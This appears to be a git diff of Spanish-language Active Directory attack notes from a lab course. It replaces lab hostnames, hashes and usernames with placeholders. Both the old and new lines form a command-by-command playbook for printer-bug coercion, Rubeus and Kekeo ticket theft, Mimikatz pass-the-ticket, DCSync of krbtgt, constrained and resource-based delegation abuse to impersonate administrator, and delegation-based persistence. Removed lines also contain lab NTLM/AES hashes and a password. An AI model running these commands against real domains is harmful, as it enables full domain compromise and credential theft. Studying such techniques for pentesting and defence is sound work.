@@ -49,7 +49,7 @@ AD:
 
 Usemos MS-RPRN.exe ([https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)) en nuestra web
 
-`.\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local`
+`.\MS-RPRN.exe \\1DOMINIO \\2DOMINIO`
 
 Con Rubeus capturamos el TGT del us-dc :
 
@@ -61,8 +61,8 @@ Se copia el TGT codificado en base64 (se eliminan los espacios) y lo usamos en l
 
 O tambien se puede hacer con mimikatz:
 
-`[IO.File]::WriteAllBytes("C:\AD\Tools\USDC.kirbi",[Convert]::FromBase64String("ticket_from_Rubeus_monitor")) 
-Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\USDC.kirbi"'`
+`[IO.File]::WriteAllBytes("C:\USDC.kirbi",[Convert]::FromBase64String("ticket_from_Rubeus_monitor")) 
+Invoke-Mimikatz -Command '"kerberos::ptt C:\USDC.kirbi"'`
 
 Corremos DCSync:
 
@@ -92,29 +92,29 @@ AD: `Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msD
 Usando Kekeo, solicitamos un TGT para la cuenta de servicio del primer salto (podemos
 usar una contraseña o hash NTLM):
 
-`tgt::ask /user:appsvc /domain:us.techcorp.local /rc4:1D49D390AC01D568F0EE9BE82BB74D4C`
+`tgt::ask /user: /domain: /rc4:`
 
 Otro tema interesante en Kerberos es que la delegación no ocurre solo para el servicio especificado, pero para cualquier servicio que se ejecute bajo la misma cuenta. No hay validación para el SPN especificado.
 Esto es grande, ya que permite el acceso a muchos servicios interesantes cuando la delegación puede ser para un servicio no intrusivo
 
 Usando kekeo, hacemos una peticion TGS:
 
-`tgs::s4u /tgt:TGT_appsvc@US.TECHCORP.LOCAL_krbtgt~us.techcorp.local@US.TECHCORP.LOCAL.kirbi /user:Administrator /service:CIFS/us-mssql.us.techcorp.local|HTTP/usmssql.us.techcorp.loc`
+`tgs::s4u /tgt:TGT_USER@DOMINIO_krbtgt~DOMINIO@DOMINIO.kirbi /user:Administrator /service:CIFS/DOMINIO|HTTP/DOMINIO`
 
 Usando mimikatz:
 
-`Invoke-Mimikatz '"kerberos::ptt TGS_Administrator@US.TECHCORP.LOCAL_HTTP~usmssql.us.techcorp.local@US.TECHCORP.LOCAL_ALT.kirbi"'`
+`Invoke-Mimikatz '"kerberos::ptt TGS_Administrator@DOMINIO_HTTP~usmssql.DOMINIO@DOMINIO.kirbi"'`
 
-`Invoke-Command -ScriptBlock{whoami} -ComputerName usmssql.us.techcorp.local`
+`Invoke-Command -ScriptBlock{whoami} -ComputerName usmssql.DOMINIO`
 
 Usando Rubeus:
 
-`Rubeus.exe s4u /user:appsvc
-/rc4:1D49D390AC01D568F0EE9BE82BB74D4C
-/impersonateuser:administrator /msdsspn:CIFS/usmssql.us.techcorp.local /altservice:HTTP
-/domain:us.techcorp.local /ptt`
+`Rubeus.exe s4u /user:
+/rc4:
+/impersonateuser:administrator /msdsspn:CIFS/usmssql.DOMINIO /altservice:HTTP
+/domain: /ptt`
 
-`winrs -r:us-mssql cmd.exe`
+`winrs -r:us- cmd.exe`
 
 Persistence - msDS-AllowedToDelegateTo
 
@@ -130,8 +130,8 @@ más ruidoso) y abusar de él más tarde.
 
 Usando PowerView:
 
-`Set-DomainObject -Identity devuser -Set @{serviceprincipalname='dev/svc'}
-Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegateto"="ldap/usdc.us.techcorp.local"}
+`Set-DomainObject -Identity USER -Set @{serviceprincipalname='dev/svc'}
+Set-DomainObject -Identity USER -Set @{"msds-allowedtodelegateto"="ldap/DOMINIO"}
 Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}
 Get-DomainUser –TrustedToAuth`
 
@@ -140,31 +140,28 @@ Usando AD:
 `Set-ADUser -Identity devuser -ServicePrincipalNames @{Add='dev/svc'} 
 Set-ADUser -Identity devuser -Add @{'msDS-AllowedToDelegateTo'= @('ldap/usdc'
 ,
-'ldap/us-dc.us.techcorp.local')} -Verbose 
+'ldap/DOMINIO')} -Verbose 
 Set-ADAccountControl -Identity devuser -TrustedToAuthForDelegation $true 
 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDSAllowedToDelegateTo`
 
 Usando kekeo:
 
-`kekeo# tgt::ask /user:devuser /domain:us.techcorp.local
+`kekeo# tgt::ask /user: /domain:
 /password:Password@123!`
 `kekeo# tgs::s4u
-/tgt:TGT_devuser@us.techcorp.local_krbtgt~us.techcorp.local@us.techc
-orp.local.kirbi /user:Administrator@us.techcorp.local
-/service:ldap/us-dc.us.techcorp.local`
+/tgt:TGT_USER@DOMINIO_krbtgt~DOMINIO@DOMINIO.kirbi /user:Administrator@us.techcorp.local
+/service:ldap/DOMINIO`
 `Invoke-Mimikatz -Command '"kerberos::ptt
-TGS_Administrator@us.techcorp.local@us.techcorp.local_ldap~usdc.us.techcorp.local@us.techcorp.local.kirbi"'`
+TGS_Administrator@DOMINIO@DOMINIO_ldap~DOMINIO@DOMINIO.kirbi"'`
 `Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'`
 
 Usando Rubeus:
 
-`Rubeus.exe hash /password:Password@123! /user:devuser /domain:us.techcorp.local`
+`Rubeus.exe hash /password:Password@123! /user: /domain:`
 
-`Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6
-/impersonateuser:administrator /msdsspn:ldap/us-dc.us.techcorp.local
-/domain:us.techcorp.local /ptt`
+`Rubeus.exe s4u /user: /rc4: /impersonateuser:administrator /msdsspn:ldap/ /domain: /ptt`
 
-`C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"`
+`C:\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"`
 
 Privilege Escalation – Resource-based Constrained Delegation
 
@@ -181,13 +178,13 @@ msDS-AllowToActOnBehalfOfOtherIdentity.
 - Ya tenemos acceso a una máquina unida a un dominio.
 - Vamos a enumerar si tenemos permisos de escritura sobre cualquier objeto.
 
-PowerView: `Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}`
+PowerView: `Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'username'}`
 
-AD(configurar RBCD para maquinas de estudiantes): `$comps = 'student86$'
-Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps`
+AD(configurar RBCD para maquinas de estudiantes): `$comps = 'username'
+Set-ADComputer -Identity pcname -PrincipalsAllowedToDelegateToAccount $comps`
 
-Ahora, obtengamos los privilegios de student86$ extrayendo sus claves ES:
+Ahora, obtengamos los privilegios de user extrayendo sus claves ES:
 
 `Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`
 
-Use la clave AES de studentx $ con Rubeus y acceda a us-helpdesk como CUALQUIER usuario que queramos: `.\Rubeus.exe s4u /user:student86$ /aes256:3185fdc962694be761cb902aec9def9a40cb31db85c7cb6536679a4e3e96d3a9 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt`
+Use la clave AES de user $ con Rubeus y acceda a pcname como CUALQUIER usuario que queramos: `.\Rubeus.exe s4u /user: /aes256: /msdsspn:http/pcname /impersonateuser:administrator /ptt`
